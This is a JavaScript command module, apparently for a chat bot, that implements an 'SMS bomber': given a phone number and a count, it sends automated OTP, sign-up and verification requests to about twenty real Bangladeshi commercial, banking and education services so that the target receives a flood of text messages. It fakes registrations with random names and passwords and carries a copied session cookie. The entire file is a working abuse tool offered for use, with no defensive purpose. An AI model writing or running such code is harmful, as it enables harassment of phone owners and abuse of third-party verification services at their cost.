const axios = require('axios');

module.exports.config = {
    name: "bomb",
    aliases: ["smsbomb", "sms"],
    version: "1.0.0",
    author: "𝐴𝑠𝑖𝑓 𝑀𝑎ℎ𝑚𝑢𝑑",
    countDown: 10,
    role: 2,
    category: "system",
    shortDescription: {
        en: "𝐴𝑑𝑣𝑎𝑛𝑐𝑒𝑑 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑡𝑜𝑜𝑙"
    },
    longDescription: {
        en: "𝐴𝑑𝑣𝑎𝑛𝑐𝑒𝑑 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑡𝑜𝑜𝑙 𝑤𝑖𝑡ℎ 𝑚𝑢𝑙𝑡𝑖𝑝𝑙𝑒 𝑠𝑒𝑟𝑣𝑖𝑐𝑒𝑠"
    },
    guide: {
        en: "{p}bomb [𝑝ℎ𝑜𝑛𝑒] [𝑎𝑚𝑜𝑢𝑛𝑡]"
    },
    dependencies: {
        "axios": ""
    },
    envConfig: {
        "𝑃𝑅𝑂𝑇𝐸𝐶𝑇𝐸𝐷_𝑁𝑈𝑀𝐵𝐸𝑅𝑆": ["1586400590", "1845296506"]
    }
};

module.exports.onStart = async function({ message, event, args }) {
    const { threadID, messageID } = event;
    const [phone, amountInput] = args;
    
    if (!phone || !amountInput) {
        return message.reply("⚠️ | 𝑈𝑠𝑎𝑔𝑒: 𝑏𝑜𝑚𝑏 [𝑝ℎ𝑜𝑛𝑒] [𝑎𝑚𝑜𝑢𝑛𝑡]", threadID, messageID);
    }
    
    if (module.exports.config.envConfig.𝑃𝑅𝑂𝑇𝐸𝐶𝑇𝐸𝐷_𝑁𝑈𝑀𝐵𝐸𝑅𝑆.includes(phone)) {
        return message.reply("🚫 | 𝑇ℎ𝑖𝑠 𝑛𝑢𝑚𝑏𝑒𝑟 𝑖𝑠 𝑝𝑟𝑜𝑡𝑒𝑐𝑡𝑒𝑑!", threadID, messageID);
    }
    
    const amount = Math.min(parseInt(amountInput) || 10, 20);
    
    try {
        message.reply(`🚀 𝑆𝑡𝑎𝑟𝑡𝑖𝑛𝑔 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑜𝑛: ${phone}\n💣 𝐴𝑚𝑜𝑢𝑛𝑡: ${amount}`, threadID, messageID);
        
        const urls = [
            `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0${phone}`,
            `https://www.bioscopelive.com/en/login/send-otp?phone=880${phone}`,
            "https://www.bioscopelive.com/en/login?type=login",
            "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
            "https://fundesh.com.bd/api/auth/resendOTP",
            "https://api.redx.com.bd/v1/user/signup",
            `https://api.bongo-solutions.com/auth/api/login/send-otp?phone=880${phone}`,
            `https://www.rokomari.com/resend-verification-code?email_phone=880${phone}`,
            `https://www.pizzahutbd.com/customer/sign-in/mobile?phone=0${phone}`,
            "https://admission.ndub.edu.bd/api/users/register-step-1/",
            `https://developer.quizgiri.xyz/api/v2.0/send-otp?phone=0${phone}`,
            "https://api.shikho.com/auth/v2/send/sms",
            "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
            "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
            `https://cms.beta.praavahealth.com/api/v2/user/login/?mobile=${phone}`,
            "https://themallbd.com/api/auth/otp_login",
            "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
            "https://api.wholesalecart.com/v2/user/login-register",
            "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp",
            "https://app.ipay.com.bd/api/v1/signup/v2",
            "https://admission.ndub.edu.bd/api/users/reset/"
        ];
        
        const headersList = [
            {"operator": "bd-otp"},
            {"referer": "https://www.bioscopelive.com/en/login"},
            {"Content-Type": "application/json"},
            {"Content-Type": "application/json"},
            {"Content-Type": "application/json"},
            {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Content-Length": "65",
                "Cookie": "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1",
                "Host": "api.redx.com.bd",
                "Origin": "https://redx.com.bd",
                "Referer": "https://redx.com.bd/registration/",
                "TE": "Trailers",
                "User-Agent": "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0",
                "x-access-token": "Bearer null"
            },
            {"Content-Type": "application/json"},
            {"Content-Type": "application/x-www-form-urlencoded"},
            {"Content-Type": "application/json"},
            {"Content-Type": "application/json"},
            {"Content-Type": "application/json"},
            {"X-Requested-With": "XMLHttpRequest"},
            {"Content-Type": "application/json"},
            {"Content-Type": "application/json"},
            {"Content-Type": "application/json"},
            {"Content-Type": "application/json"},
            {"Content-Type": "application/json"}
        ];
        
        const dataList = [
            null,
            null,
            null,
            `{"msisdn":"${phone}"}`,
            `{"msisdn":"${phone}"}`,
            `{"name":"${generateRandomString(4)}","phoneNumber":"${phone}","service":"redx"}`,
            `{"operator":"all","msisdn":"880${phone}"}`,
            null,
            `_token=${generateRandomString(32)}&phone_number=0${phone}`,
            `{"name":"${generateRandomString(5)}","email":"${generateRandomString(7)}@gmail.com","phone":"0${phone}","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}`,
            `{"phone":"0${phone}","country_code":"+880","fcm_token":null}`,
            `{"phone":"+880${phone}","email":null,"auth_type":"login"}`,
            `{"send":"true","phoneNumber":"${phone}","emailConsent":"true","whatsappConsent":"true"}`,
            `{"AccessToken": "","TrackingNo": "","mobileNo": "0${phone}","otpSms": "","product_id": "201","requestChannel": "MOB","trackingStatus": 5}`,
            null,
            `{"phone_number":"+880${phone}"}`,
            `{"name":"${generateRandomString(5)}","mobile_no":"0${phone}","password":"${generateRandomString(16)}","confirm_password":"${generateRandomString(16)}"}`,
            `{"platform":"google","url":"https://www.google.com/","phone":"${phone}"}`,
            `{"accountType":1,"deviceId":"mobile-android-SM-N971N-${generateRandomString(16)}","mobileNumber":"+880${phone}"}`,
            `{"phone": "0${phone}"}`
        ];
        
        let successCount = 0;
        let failedCount = 0;
        let progressMessage = "";
        
        for (let i = 0; i < amount; i++) {
            try {
                const url = urls[i];
                const headers = headersList[i] || {};
                const data = dataList[i];
                
                let response;
                if (data) {
                    response = await axios.post(url, data, { headers });
                } else {
                    response = await axios.get(url, { headers });
                }
                
                if (response.status === 200) {
                    successCount++;
                    progressMessage += `✅ | 𝑆𝑢𝑐𝑐𝑒𝑠𝑠: ${url.split('/')[2]}\n`;
                } else {
                    failedCount++;
                    progressMessage += `❌ | 𝐹𝑎𝑖𝑙𝑒𝑑: ${url.split('/')[2]}\n`;
                }
                
                if ((i + 1) % 5 === 0 || i === amount - 1) {
                    message.reply(
                        `📈 𝑃𝑟𝑜𝑔𝑟𝑒𝑠𝑠: ${i + 1}/${amount}\n` +
                        `✅ 𝑆𝑢𝑐𝑐𝑒𝑠𝑠: ${successCount} | ❌ 𝐹𝑎𝑖𝑙𝑒𝑑: ${failedCount}\n` +
                        `─────────────────\n` +
                        progressMessage,
                        threadID
                    );
                    progressMessage = "";
                }
                
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (error) {
                failedCount++;
                progressMessage += `🔥 | 𝐸𝑟𝑟𝑜𝑟: ${urls[i].split('/')[2]}\n`;
            }
        }
        
        message.reply(
            `🎯 𝐵𝑜𝑚𝑏𝑖𝑛𝑔 𝐶𝑜𝑚𝑝𝑙𝑒𝑡𝑒𝑑!\n` +
            `─────────────────\n` +
            `📱 𝑇𝑎𝑟𝑔𝑒𝑡: ${phone}\n` +
            `💣 𝑇𝑜𝑡𝑎𝑙 𝑆𝑒𝑛𝑡: ${amount}\n` +
            `✅ 𝑆𝑢𝑐𝑐𝑒𝑠𝑠𝑓𝑢𝑙: ${successCount}\n` +
            `❌ 𝐹𝑎𝑖𝑙𝑒𝑑: ${failedCount}\n` +
            `⚡ 𝑃𝑜𝑤𝑒𝑟𝑒𝑑 𝐵𝑦: 𝐴𝑠𝑖𝑓 𝑀𝑎ℎ𝑚𝑢𝑑`,
            threadID,
            messageID
        );
        
    } catch (error) {
        message.reply(`❌ | 𝐸𝑟𝑟𝑜𝑟: ${error.message}`, threadID, messageID);
    }
};

function generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}
